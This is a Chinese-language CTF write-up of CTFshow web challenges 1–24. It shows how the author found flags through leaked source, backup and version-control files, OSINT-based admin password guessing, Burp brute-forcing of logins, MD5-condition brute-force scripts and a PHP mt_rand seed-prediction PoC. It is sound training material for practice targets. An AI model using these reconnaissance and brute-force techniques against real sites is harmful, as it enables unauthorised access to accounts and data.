                    <a href="#web362" aria-label="web362">web362</a></li></ul>
                </li>
                <li>
                    <a href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="Java反序列化：">Java反序列化：</a><ul>
                        
                <li>
                    <a href="#web846" aria-label="web846">web846</a>
                </li>
            </ul>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="ctfshow_web">CTFshow_Web<a hidden class="anchor" aria-hidden="true" href="#ctfshow_web">#</a></h1>
<h3 id="信息收集完工"><strong>信息收集</strong>：（完工）<a hidden class="anchor" aria-hidden="true" href="#信息收集完工">#</a></h3>
<h4 id="web-1-5">Web 1-5<a hidden class="anchor" aria-hidden="true" href="#web-1-5">#</a></h4>
<ul>
<li>查看网页源代码</li>
<li>抓个包看有没有藏东西</li>
<li>查看robots.txt</li>
<li>phps源码泄露，访问index.phps，通过其源码泄露，在其中找到flag</li>
</ul>
<h4 id="web6">Web6<a hidden class="anchor" aria-hidden="true" href="#web6">#</a></h4>
<p>网页提示下载源码查看，访问url/www.zip得到源码文件</p>
<p>解压文件我们得到</p>
<img src="assets/202411102303478.png" alt="image-20241102003213997" style="zoom:200%;" />
<p>打开fl00g.txt，没有我们想要的flag</p>
<p>打开index.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-01 14:37:13
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-01 14:42:44
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in fl000g.txt
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;web6:where is flag?&#34;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>显示flag in fl00g.txt</p>
<p>直接访问url/fl00g.txt得到flag</p>
<h4 id="web7">web7<a hidden class="anchor" aria-hidden="true" href="#web7">#</a></h4>
<p>git泄露，访问url/.git即可得到flag</p>
<h4 id="web8">web8<a hidden class="anchor" aria-hidden="true" href="#web8">#</a></h4>
<p>svn泄露，访问url/.git即可得到flag</p>
<h4 id="web9">web9<a hidden class="anchor" aria-hidden="true" href="#web9">#</a></h4>
<p>vim缓存信息泄露，访问url/index.php.swp，打开下载的index.php.swp即可得到flag</p>
<h4 id="web10">web10<a hidden class="anchor" aria-hidden="true" href="#web10">#</a></h4>
<p>根据hint查看cookie可以看到</p>
<blockquote>
<p>cookie:flag=ctfshow%7B3ac14c03-64d1-41aa-9328-c97bcceeb840%7D</p></blockquote>
<p>进行url解码即可得到flag</p>
<p><img alt="image-20241106010021516" loading="lazy" src="assets/202411072207591.png"></p>
<h4 id="web11">web11<a hidden class="anchor" aria-hidden="true" href="#web11">#</a></h4>
<p>域名解析</p>
<p>我们可以通过nslookup来进行域名解析查询</p>
<pre tabindex="0"><code>nslookup -qt=格式 URL
</code></pre><pre tabindex="0"><code>nslookup -qt=any URL 
//遍历所有格式
</code></pre><pre tabindex="0"><code>nslookup -qt=TXT URL
//查询txt格式
</code></pre><h4 id="web12">web12<a hidden class="anchor" aria-hidden="true" href="#web12">#</a></h4>
<p>hint：有时候网站上的公开信息，就是管理员常用密码</p>
<p>先用dirsearch扫一下</p>
<p><img alt="image-20241106092048352" loading="lazy" src="assets/202411072207900.png"></p>
<p>访问admin，要求我们输入管理员账号密码，根据后台路径我们可以猜测账号为<code>admin</code></p>
<p>回到主页，在网页的底部我们可以看到一个电话<code>Help Line Number : 372619038</code></p>
<p>猜测电话为管理员密码，输入后成功得到flag</p>
<h4 id="web13">web13<a hidden class="anchor" aria-hidden="true" href="#web13">#</a></h4>
<p>在页面底部可以看到一个document</p>
<p><img alt="image-20241106121019219" loading="lazy" src="assets/202411072207995.png"></p>
<p>点击发现下载了一个document.pdf文件，文件里有后台的地址和账号密码</p>
<p><img alt="image-20241106121415093" loading="lazy" src="assets/202411072207016.png">d</p>
<p>登录后台即可得到flag</p>
<h4 id="web14">web14<a hidden class="anchor" aria-hidden="true" href="#web14">#</a></h4>
<p>根据hint知道editor处应该有信息泄漏(虽然不知道什么是editor)</p>
<p>我们先用dirsearch扫一下后台</p>
<img src="assets/NUQB3oh7mj5ATvJ.png" alt="image-20241106202626586" style="zoom:50%;" />
<p>访问url/editor</p>
<img src="assets/UvozfSbVdp3xLPW.png" alt="image-20241106202742084" style="zoom: 50%;" />
<p>是一个文字编辑的页面，我们可以发现在上传附件📎出可以调用出到服务器的文件管理器</p>
<p>在服务器的根目录没看到flag，尝试查看网站的根目录(var/www/html),看看有没有隐藏页面</p>
<p>发现nothinghere文件夹中有个fl00g.txt文件</p>
<p>访问url/nothinghere/f1000g.txt即可得到flag</p>
<h4 id="web15">web15<a hidden class="anchor" aria-hidden="true" href="#web15">#</a></h4>
<p>扫描到后台为url/admin，打开看到有个忘记密码，要求输入城市</p>
<p><img alt="image-20241112203115743" loading="lazy" src="./assets/image-20241112203115743.png"></p>
<p><img alt="image-20241112203225217" loading="lazy" src="./assets/image-20241112203225217.png"></p>
<p>根据hint我们可以在主页底部找到一个qq邮箱，查询一下qq号</p>
<img src="./assets/image-20241112203325025.png" alt="image-20241112203325025" style="zoom:50%;" />
<p>得到信息，现居陕西西安</p>
<p>输入西安成功重置密码，输入重置密码和帐号admin，成功得到flag</p>
<h4 id="web16">Web16<a hidden class="anchor" aria-hidden="true" href="#web16">#</a></h4>
<p>探针泄漏</p>
<p>dirsearch 扫描不到这个探针，看wp才知道的</p>
<p>探针在url/tz.php</p>
<p>访问探针</p>
<p><img alt="image-20241112204025693" loading="lazy" src="./assets/image-20241112204025693.png"></p>
<p><img alt="image-20241112204437105" loading="lazy" src="./assets/image-20241112204437105.png"></p>
<p>在指针里面可以找到phpinfo页面</p>
<p>打开在phpinfo里面可以找到flag</p>
<p><img loading="lazy" src="./assets/image-20241112204552383.png"></p>
<h4 id="web17">web17<a hidden class="anchor" aria-hidden="true" href="#web17">#</a></h4>
<p>sql备份泄漏</p>
<p><img alt="image-20241112205219664" loading="lazy" src="./assets/image-20241112205219664.png"></p>
<p>用dirsearch扫出来存在sql备份泄漏，下载backup.sql，打开得到flag</p>
<p><img alt="image-20241112205527202" loading="lazy" src="./assets/image-20241112205527202.png"></p>
<h4 id="web18">web18<a hidden class="anchor" aria-hidden="true" href="#web18">#</a></h4>
<p>本题是一个游戏，玩到101分就能得到flag</p>
<p>我们直接看js</p>
<p>Flappy_js.js</p>
<p><img alt="image-20241113125910231" loading="lazy" src="assets/image-20241113125910231.png"></p>
<p>审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试</p>
<p><img alt="image-20241113130107163" loading="lazy" src="assets/image-20241113130107163.png"></p>
<p>根据提示访问url/110.php,得到flag</p>
<h4 id="web19">web19<a hidden class="anchor" aria-hidden="true" href="#web19">#</a></h4>
<p>题目是一个登录的页面，根据hint查看网页源代码</p>
<p><img alt="image-20241113132533968" loading="lazy" src="assets/image-20241113132533968.png"></p>
<p>根据提示，这道题应该是一道对密码进行了加密的题目</p>
<p>审阅一下代码我们得到这些信息</p>
<blockquote>
<p>mode模式： CBC padding 填充方式： ZeroPadding
密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038
密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</p></blockquote>
<p><a href="https://www.toolhelper.cn/SymmetricEncryption/AES">AES 加密/解密 - 锤子在线工具</a></p>
<p>用解密工具解密一下密文我们可以得到密码为</p>
<p><img alt="image-20241113133003036" loading="lazy" src="assets/image-20241113133003036.png"></p>
<p>输入密码，得到flag</p>
<h4 id="web20">web20<a hidden class="anchor" aria-hidden="true" href="#web20">#</a></h4>
<blockquote>
<p>hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote>
<p>这是一个使用access数据库的asp程序</p>
<p>根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb</p>
<p>下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}</p>
<p><img alt="image-20241113134305246" loading="lazy" src="assets/image-20241113134305246.png"></p>
<h3 id="爆破完工">爆破：（完工）<a hidden class="anchor" aria-hidden="true" href="#爆破完工">#</a></h3>
<h4 id="web21">web21<a hidden class="anchor" aria-hidden="true" href="#web21">#</a></h4>
<p><img alt="image-20241123165104490" loading="lazy" src="assets/image-20241123165104490.png"></p>
<p>抓个包</p>
<p><img alt="image-20241123165621808" loading="lazy" src="assets/image-20241123165621808.png"></p>
<p>我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大</p>
<p>payload设置如下</p>
<p><img alt="image-20241123165947562" loading="lazy" src="assets/image-20241123165947562.png"></p>
<p><img alt="image-20241123170139759" loading="lazy" src="assets/image-20241123170139759.png"></p>
<p>我们还要设置一下payload处理</p>
<p><img alt="image-20241123170509504" loading="lazy" src="assets/image-20241123170509504.png"></p>
<p>开始爆破，根据长度或者状态码判断即可</p>
<p><img alt="image-20241123172859359" loading="lazy" src="assets/image-20241123172859359.png"></p>
<h4 id="web22">web22<a hidden class="anchor" aria-hidden="true" href="#web22">#</a></h4>
<p>域名爆破</p>
<p>通过爆破ctf.show的子域名可以爆破到flag.ctf.show</p>
<p>访问即可得到flag(虽然已经挂了)</p>
<h4 id="web23">web23<a hidden class="anchor" aria-hidden="true" href="#web23">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 11:43:51
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 11:56:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$token</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">===</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">===</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span><span class="mi">1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">+</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">+</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">/</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">===</span><span class="nx">intval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$token</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span><span class="mi">1</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：</p>
<p>1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位</p>
<p>2、md5(token) 的第 14 位等于第 17 位。</p>
<p>3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。</p>
<p>既然不知道怎么凑那我们可以尝试爆破</p>
<p>通过bp爆破一下1-1000中是否有符合上述条件的字符串</p>
<p><img alt="image-20241123230839908" loading="lazy" src="assets/image-20241123230839908.png"></p>
<p>哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来</p>
<p>其他解法，可以用大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># coding: utf-8</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># alberthao</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">dic</span> <span class="o">=</span> <span class="s1">&#39;0123456789qazwsxedcrfvtgbyhnujmikolp&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># print md5</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># print md5[1:2]</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="c1"># print md5[14:15]</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># print md5[17:18]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="ow">and</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="o">==</span> <span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">]))</span> <span class="o">&gt;=</span> <span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">                        <span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">:</span><span class="mi">15</span><span class="p">])</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">]))</span> <span class="o">/</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">])</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">:</span><span class="mi">32</span><span class="p">]):</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span> <span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">or</span> <span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span><span class="o">!=</span> <span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">	<span class="k">continue</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">&gt;=</span><span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">&lt;=</span><span class="mi">57</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">]))</span><span class="o">&gt;=</span><span class="mi">48</span> <span class="ow">and</span> <span class="nb">ord</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">])</span><span class="o">&lt;=</span><span class="mi">57</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">	<span class="k">if</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span><span class="o">+</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">17</span><span class="p">]))</span><span class="o">/</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">==</span><span class="nb">int</span><span class="p">(</span><span class="n">md5</span><span class="p">[</span><span class="mi">31</span><span class="p">])):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web24">web24<a hidden class="anchor" aria-hidden="true" href="#web24">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-03 13:26:39
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-03 13:53:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;r&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nx">mt_srand</span><span class="p">(</span><span class="mi">372619038</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">===</span><span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">())){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;cat /proc/version&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这道题考察的是一个php伪随机数的题目</p>
<blockquote>
<p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的</p></blockquote>
<p>虽然说是随机数，但是同一个种子会生成同一串数字</p>
<p>poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">372619038</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nx">mt_rand</span><span class="p">());</span> 
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag</p>
<h4 id="web25">web25<a hidden class="anchor" aria-hidden="true" href="#web25">#</a></h4>
